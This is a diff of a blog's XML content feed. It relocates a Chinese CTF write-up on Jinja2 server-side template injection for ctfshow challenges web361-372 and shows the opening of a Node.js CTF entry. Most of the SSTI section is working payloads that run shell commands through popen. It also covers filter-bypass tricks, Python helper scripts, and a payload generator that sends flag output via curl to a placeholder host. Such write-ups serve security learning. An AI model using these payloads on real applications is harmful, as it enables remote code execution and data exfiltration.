<span class="string">&#x27;nine&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = change[a]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#拆解payload,并进行ascii转码保存在一个数组中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">devide</span>(<span class="params">payload</span>):</span><br><span class="line">    go = <span class="built_in">list</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(go):</span><br><span class="line">        go[i] = <span class="built_in">str</span>(<span class="built_in">ord</span>(val))</span><br><span class="line">    <span class="keyword">return</span> go</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取拼接的字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">go</span>):</span><br><span class="line">    temp = <span class="built_in">list</span>(go)</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(temp):</span><br><span class="line">        <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(temp)-<span class="number">1</span>:</span><br><span class="line">            res+=change(val)+<span class="string">&quot;~&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res+=change(val)</span><br><span class="line">    <span class="keyword">return</span> res    </span><br><span class="line">            </span><br><span class="line">payload = <span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;curl http://xxxx:23333?`cat /flag`&quot;)&#x27;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">ppp = devide(payload)</span><br><span class="line"><span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(ppp):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(ppp)-<span class="number">1</span>:</span><br><span class="line">        res += <span class="string">&quot;chr((&quot;</span>+merge(val)+<span class="string">&quot;)|int)~&quot;</span><span class="comment">#加int的原因是chr()只能传入数字,就是说不接受chr(&#x27;1&#x27;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += <span class="string">&quot;chr((&quot;</span>+merge(val)+<span class="string">&quot;)|int)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
-
-<p>小弹一下,成功！</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240412172735048.png"  alt="image-20240412172735048"></p>
-<h1 id="web-372"><a href="#web-372" class="headerlink" title="web 372"></a>web 372</h1><p>把count禁了，只需把上题的count换位length即可</p>
-<h1 id="vulhub复现"><a href="#vulhub复现" class="headerlink" title="vulhub复现"></a>vulhub复现</h1><p>vulhub复现是不能用</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;打而且有回显的，又能学到新东西</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for i in &#x27;&#x27;.__class__.__mro__[1].__subclasses__() %&#125;</span><br><span class="line">    &#123;% if i.__name__==&#x27;_wrap_close&#x27; %&#125;</span><br><span class="line">        &#123;% print i.__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read() %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这样还省去了写脚本的时间，多方便啊</p>
-]]></content>
-      <categories>
-        <category>学习</category>
-      </categories>
-      <tags>
-        <tag>入门</tag>
-        <tag>学习</tag>
-        <tag>ctfshow</tag>
       </tags>
   </entry>
   <entry>
@@ -664,6 +559,111 @@
       </tags>
   </entry>
   <entry>
+    <title>SSTI-CTFSHOW</title>
+    <url>/2024/04/12/SSTI-CTFSHOW-1/</url>
+    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
+
+<p><a class="link"   href="https://boogipop.com/2023/03/02/CTFSHOW-SSTI/" >CTFSHOW-SSTI - Boogiepop Doesn’t Laugh (boogipop.com)<i class="fas fa-external-link-alt"></i></a></p>
+<p>巨几把详细，使我逐渐理解一切</p>
+<h1 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240329185224740.png"  alt="image-20240329185224740"></p>
+<p>需要在url传入name&#x3D;payload</p>
+<p>但是我们并不知道subclasses()后，os._wrap_close类在哪</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240329185402511.png"  alt="image-20240329185402511"></p>
+<p>小写了个脚本去找</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line">  text = <span class="built_in">input</span>(<span class="string">&quot;[+]需要查找的文本为:&quot;</span>)</span><br><span class="line">  pattern = <span class="string">r&quot;&#x27;(.*?)&#x27;&quot;</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]你可能要找的类有:os._wrap_close,file,site._Printer,subprocess.Popen,warnings.catch_warnings&quot;</span>)</span><br><span class="line">  find = <span class="built_in">input</span>(<span class="string">&quot;[+]需要匹配的类为:&quot;</span>)</span><br><span class="line">  result = re.findall(pattern,text)</span><br><span class="line">  <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(result):</span><br><span class="line">      <span class="keyword">if</span>(re.<span class="keyword">match</span>(find,val)):</span><br><span class="line">          <span class="built_in">print</span>(<span class="string">&quot;[-]下标为&quot;</span>,i)</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">  flag = <span class="built_in">input</span>(<span class="string">&quot;[+]继续扣1结束扣0:&quot;</span>)    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240329185449121.png"  alt="image-20240329185449121"></p>
+<p>进而payload&#x3D;<code>?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;</code></p>
+<h1 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240403152139654.png"  alt="image-20240403152139654"></p>
+<p>一样的name传参，把上题的payload放了进去，给我回了个板脸</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153827422.png"  alt="image-20240403153827422"></p>
+<p>不知道禁了什么，我们把payload一个字一个字拆开再用burpsuite爆破进行fuzz</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="built_in">input</span>(<span class="string">&quot;[+]需要拆解的文本为&quot;</span>)</span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;dep.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    file.write(i+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153936033.png"  alt="image-20240403153936033"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240403153954072.png"  alt="image-20240403153954072"></p>
+<p>发现把2和3ban掉了，相当于想ban掉<code>os._wrap_close</code>呗</p>
+<p>payload1:<code>?name=&#123;&#123;%27%27.__class__.__base__.__subclasses__()[147-15].__init__.__globals__['popen']('tac ../flag').read()&#125;&#125;</code></p>
+<p>payload2:<code>?name=&#123;%set b=(dict(b=c,c=d)|join|count)%&#125;&#123;&#123;''.__class__.__base__.__subclasses__()[66*b].__init__.__globals__['popen']('tac /f*').read()&#125;&#125;</code></p>
+<p>payload3:<code>?name=&#123;&#123;x.__init__.__globals__['__builtins__'].eval('__import__("os").popen("cat /flag").read()')&#125;&#125;</code></p>
+<p>payload4:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">或者</span><br><span class="line">?name=&#123;&#123;url_for.__globals__.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>最喜欢的最短的一个:</p>
+<p>payload5:<code>name=&#123;&#123;lipsum.__global__.os.popen('cat /flag')&#125;&#125;</code></p>
+<p>变种最多的一集，在网上看到很多，不过都2024了还会有开发人员犯这个病吗，实战估计是用不到了</p>
+<h1 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240408173012712.png"  alt="image-20240408173012712"></p>
+<p>参数逃逸，好喜欢，高效帅气巧妙</p>
+<p>payload:<code>name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.args.gogogo)&#125;&#125;&amp;gogogo=__import__(%27os%27).popen(%27cat%20/flag%27).read()</code></p>
+<h1 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h1><p>ban掉了arg和单双引号</p>
+<p>payload2:<code>name=&#123;&#123;url_for.__globals__.__builtins__.eval(request.cookies.gogogo)&#125;&#125;</code></p>
+<p>再在cookie加入<code>gogogo=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code>即可</p>
+<p>我才知道cookie传多个值是需要分号而不是&amp;</p>
+<p>而且这里传入的cookie不能有字符是url编码的，不知道是hackbar不帮我编码呢，还是服务器不帮我解码呢，还是说cookie本来就不需要url编解码</p>
+<h1 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h1><p>在前ban掉了arg和单双引号和中括号</p>
+<p>和上题一样的payload</p>
+<h1 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h1><p>ban掉了下划线</p>
+<p>payload1:<code>?name=&#123;&#123;(lipsum|attr(request.values.a)).os.popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat /flag</code></p>
+<p>payload2:<code>name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
+<p>d原来之前可以不用cookie，用values就好</p>
+<h1 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h1><p>之前的基础上禁用了os</p>
+<p>payload1:<code>name=&#123;&#123;(x|attr(request.values.x1)|attr(request.values.x2)|attr(request.values.x3))(request.values.x4).eval(request.values.x5)&#125;&#125;&amp;x1=__init__&amp;x2=__globals__&amp;x3=__getitem__&amp;x4=__builtins__&amp;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
+<p>payload2:<code>name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.go).popen(request.values.b).read()&#125;&#125;&amp;a=__globals__&amp;b=cat%20/flag&amp;go=os</code></p>
+<p>这里get方法想出来很顺滑，因为一开始咱们想把os逃出来可以想的是reque.values.gogo，但是这个弄出来只能返回字符串”os”,并不能返回类os,所以用get</p>
+<h1 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#过滤了&#123;&#123;,用&#123;%%&#125;加print即可</span><br></pre></td></tr></table></figure>
+
+<p>payload:<code>name=s&#123;%print((lipsum|attr(request.values.a)).get(request.values.go).popen(request.values.b).read())%&#125;&amp;a=__globals__&amp;b=cat%20/flag&amp;go=os</code></p>
+<p>print里的改为上面的payload2一样的</p>
+<h1 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h1><p>以上基础上ban了request</p>
+<h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一:"></a>方法一:</h3><p>有点小复杂，要写脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line"> payload=<span class="built_in">input</span>(<span class="string">&quot;要找啥&quot;</span>)</span><br><span class="line"> fpayload=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">for</span> j <span class="keyword">in</span> payload:</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">1000</span>):</span><br><span class="line">   url=<span class="string">f&quot;http://e870d70a-c035-4b9e-8e6c-f6137ed08cbe.challenge.ctf.show//?name=&#123;&#123;%print((config|string|list).pop(<span class="subst">&#123;i&#125;</span>).lower())%&#125;&#125;&quot;</span></span><br><span class="line">   r = requests.get(url=url)</span><br><span class="line">   index = r.text.find(<span class="string">&#x27;&lt;h3&gt;&#x27;</span>)</span><br><span class="line">   single = r.text[index+<span class="number">4</span>:index+<span class="number">5</span>].lower()</span><br><span class="line">  <span class="comment">#print(f&quot;[+]&#123;j&#125;&quot;)</span></span><br><span class="line">  <span class="comment">#print(single)</span></span><br><span class="line">   <span class="keyword">if</span> j==single:</span><br><span class="line">    fpayload+=<span class="string">f&quot;(config|string|list).pop(<span class="subst">&#123;i&#125;</span>)~&quot;</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(payload)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(fpayload)</span><br><span class="line">  flag = <span class="built_in">input</span>(<span class="string">&quot;继续不&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>思路是把<code>&#123;%print((lipsum|attr('__globals__')).get('os').popen('cat /flag').read())%&#125;</code>这个里面的<code>__globals__</code>和<code>os</code>和<code>cat /flag</code>替换就好</p>
+<p>payload:我的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%print((lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())).get((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()).popen((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()).read())%&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二:"></a>方法二:</h3><p>通过设置变量和拼接变量合成一句话</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=</span><br><span class="line">&#123;% set a=(()|select|string|list).pop(24) %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set init=(a,a,dict(init=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set a=(lipsum|attr(globals)).get(builtins) %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % set chr=a.chr %&#125;</span><br><span class="line">&#123;</span><br><span class="line">   % print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;</span><br><span class="line">#合成一句话：</span><br><span class="line">?name=&#123;% set a=(()|select|string|list).pop(24) %&#125;&#123;% set globals=(a,a,dict(globals=1)|join,a,a)|join %&#125;&#123;% set init=(a,a,dict(init=1)|join,a,a)|join %&#125;&#123;% set builtins=(a,a,dict(builtins=1)|join,a,a)|join %&#125;</span><br><span class="line">&#123;% set a=(lipsum|attr(globals)).get(builtins) %&#125;</span><br><span class="line">&#123;% set chr=a.chr %&#125;</span><br><span class="line">&#123;% print a.open(chr(47)~chr(102)~chr(108)~chr(97)~chr(103)).read() %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>相当于</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lipsum.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/flag&#x27;).read()</span><br><span class="line"></span><br><span class="line"># 在__builtins__里面拿到chr，同样可以很方便的构造字符</span><br></pre></td></tr></table></figure>
+
+<h1 id="web370"><a href="#web370" class="headerlink" title="web370"></a>web370</h1><p>过滤了数字,要用cout构造数字</p>
+<p>比如dict{aaaaaa&#x3D;a|join|cout}是等于6的，键值有多少个字符，这个表达式就代表几个数字，想办法用这个格式把上题的payload中的数字替换即可</p>
+<p>payload1:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set nummm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">#32</span><br><span class="line">&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">#47</span><br><span class="line">&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125; #24</span><br><span class="line">&#123;%set x=(()|select|string|list).pop(num)%&#125; #_</span><br><span class="line">&#123;%set o=dict(o=a,s=b)|join%&#125;</span><br><span class="line">#os</span><br><span class="line">&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;</span><br><span class="line">#得到__globals__前面的join是把globals变为字符串</span><br><span class="line">&#123;%set builtins=(x,x,dict(builtins=a)|join,x,x)|join%&#125;</span><br><span class="line">#__builtins__</span><br><span class="line">&#123;%set c=dict(chr=a)|join%&#125;</span><br><span class="line">#chr</span><br><span class="line">&#123;%set chr=((lipsum|attr(glob)).get(builtins)).get(c)%&#125;</span><br><span class="line">#chr函数</span><br><span class="line">&#123;%set cmd=dict(cat=a)|join~chr(nummm)~chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">#cat /flag</span><br><span class="line">&#123;%print((lipsum|attr(glob)).get(o).popen(cmd).read())%&#125;</span><br><span class="line">#最终payload如下</span><br><span class="line">?name=&#123;%set nummm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;&#123;%set x=(()|select|string|list).pop(num)%&#125;&#123;%set o=dict(o=a,s=b)|join%&#125;&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;&#123;%set builtins=(x,x,dict(builtins=a)|join,x,x)|join%&#125;&#123;%set c=dict(chr=a)|join%&#125;&#123;%set chr=((lipsum|attr(glob)).get(builtins)).get(c)%&#125;&#123;%set cmd=chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">&#123;%set cmd=dict(cat=a)|join~chr(nummm)~chr(numm)~dict(flag=a)|join%&#125;&#123;%print((lipsum|attr(glob)).get(o).popen(cmd).read())%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload2:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set num=dict(aaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set numm=dict(aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%set x=(()|select|string|list).pop(num)%&#125;</span><br><span class="line">&#123;%set glob = (x,x,dict(globals=a)|join,x,x)|join %&#125;</span><br><span class="line">&#123;%set builtins=x~x~(dict(builtins=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set c = dict(chr=a)|join%&#125;</span><br><span class="line">&#123;%set o = dict(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%set getitem = x~x~(dict(getitem=a)|join)~x~x%&#125;</span><br><span class="line">&#123;%set chr = lipsum|attr(glob)|attr(getitem)(builtins)|attr(getitem)(c)%&#125;</span><br><span class="line">&#123;%set file = chr(numm)~dict(flag=a)|join%&#125;</span><br><span class="line">&#123;%print((lipsum|attr(glob)|attr(getitem)(builtins)).open(file).read())%&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="web371"><a href="#web371" class="headerlink" title="web371"></a>web371</h1><p>过滤了print但还是可以执行命令，用curl带出flag</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% set one=dict(b=j)|join|count%&#125;</span><br><span class="line">&#123;% set two=dict(bb=j)|join|count%&#125;</span><br><span class="line">&#123;% set three=dict(bbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set four=dict(bbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set five=dict(bbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set six=dict(bbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set seven=dict(bbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set eight=dict(bbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set nine=dict(bbbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set ten=dict(bbbbbbbbbb=j)|join|count%&#125;</span><br><span class="line">&#123;% set zero=(one-one)%&#125;</span><br><span class="line">&#123;% set pop=(four*six)%&#125;</span><br><span class="line">&#123;% set a=(()|select|string|list).pop(pop)%&#125;</span><br><span class="line">&#123;% set global=(a,a,dict(globals=d)|join,a,a)|join%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join%&#125;</span><br><span class="line">&#123;% set go=(lipsum|attr(global)).get(built)%&#125;</span><br><span class="line">&#123;% set chr=go.chr%&#125;</span><br><span class="line">&#123;% set cmd=%&#125;</span><br><span class="line">&#123;%if go.eval(cmd)%&#125;</span><br><span class="line">yes</span><br><span class="line">&#123;%endif%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>cmd生成脚本:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#eg:chr((six~five)|int)~chr((six~six|int))---&gt;AB</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#替换123</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">a</span>):</span><br><span class="line">    change = &#123;</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span> : <span class="string">&#x27;zero&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;1&#x27;</span> : <span class="string">&#x27;one&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;2&#x27;</span> : <span class="string">&#x27;two&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span> : <span class="string">&#x27;three&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;4&#x27;</span> : <span class="string">&#x27;four&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5&#x27;</span> : <span class="string">&#x27;five&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;6&#x27;</span> : <span class="string">&#x27;six&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;7&#x27;</span> : <span class="string">&#x27;seven&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;8&#x27;</span> : <span class="string">&#x27;eight&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;9&#x27;</span> : <span class="string">&#x27;nine&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = change[a]</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#拆解payload,并进行ascii转码保存在一个数组中</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">devide</span>(<span class="params">payload</span>):</span><br><span class="line">    go = <span class="built_in">list</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(go):</span><br><span class="line">        go[i] = <span class="built_in">str</span>(<span class="built_in">ord</span>(val))</span><br><span class="line">    <span class="keyword">return</span> go</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取拼接的字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">go</span>):</span><br><span class="line">    temp = <span class="built_in">list</span>(go)</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(temp):</span><br><span class="line">        <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(temp)-<span class="number">1</span>:</span><br><span class="line">            res+=change(val)+<span class="string">&quot;~&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res+=change(val)</span><br><span class="line">    <span class="keyword">return</span> res    </span><br><span class="line">            </span><br><span class="line">payload = <span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;curl http://xxxx:23333?`cat /flag`&quot;)&#x27;</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">ppp = devide(payload)</span><br><span class="line"><span class="keyword">for</span> i,val <span class="keyword">in</span> <span class="built_in">enumerate</span>(ppp):</span><br><span class="line">    <span class="keyword">if</span> i&lt;<span class="built_in">len</span>(ppp)-<span class="number">1</span>:</span><br><span class="line">        res += <span class="string">&quot;chr((&quot;</span>+merge(val)+<span class="string">&quot;)|int)~&quot;</span><span class="comment">#加int的原因是chr()只能传入数字,就是说不接受chr(&#x27;1&#x27;)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += <span class="string">&quot;chr((&quot;</span>+merge(val)+<span class="string">&quot;)|int)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
+
+<p>小弹一下,成功！</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240412172735048.png"  alt="image-20240412172735048"></p>
+<h1 id="web-372"><a href="#web-372" class="headerlink" title="web 372"></a>web 372</h1><p>把count禁了，只需把上题的count换位length即可</p>
+<h1 id="vulhub复现"><a href="#vulhub复现" class="headerlink" title="vulhub复现"></a>vulhub复现</h1><p>vulhub复现是不能用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;打而且有回显的，又能学到新东西</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for i in &#x27;&#x27;.__class__.__mro__[1].__subclasses__() %&#125;</span><br><span class="line">    &#123;% if i.__name__==&#x27;_wrap_close&#x27; %&#125;</span><br><span class="line">        &#123;% print i.__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read() %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样还省去了写脚本的时间，多方便啊</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>入门</tag>
+        <tag>学习</tag>
+        <tag>ctfshow</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XXE漏洞学习</title>
     <url>/2024/02/27/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="基于xml文档使用中产生的漏洞"><a href="#基于xml文档使用中产生的漏洞" class="headerlink" title="基于xml文档使用中产生的漏洞"></a>基于xml文档使用中产生的漏洞</h1><span id="more"></span>
@@ -729,83 +729,6 @@
         <tag>ctf</tag>
         <tag>入门</tag>
         <tag>学习</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>nodejs-ctfshow</title>
-    <url>/2024/03/02/nodejs-ctfshow/</url>
-    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
-
-<h1 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h1><p>给了两个源码文件和一个登录界面</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303111933863.png"  alt="image-20240303111933863"></p>
-<p>前端可以看到的，以post数据提交用户名和密码，以json格式接受返回数据</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303112015481.png"  alt="image-20240303112015481"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303112028812.png"  alt="image-20240303112028812"></p>
-<p>这里给了用户名和密码，然后看了一下登录检验</p>
-<p>用户名不能为CTFSHOW，输入的用户名会经过<code>toUpperCase()</code>转化为大写后与数据比较，密码正常比较。</p>
-<p>既然会转化为大写，直接输入ctfshow(小写)即可</p>
-<h1 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h1><p>题面</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124252606.png"  alt="image-20240303124252606"></p>
-<p>信息收集</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124304897.png"  alt="image-20240303124304897"></p>
-<p>抓包扫描后无果</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124335586.png"  alt="image-20240303124335586"></p>
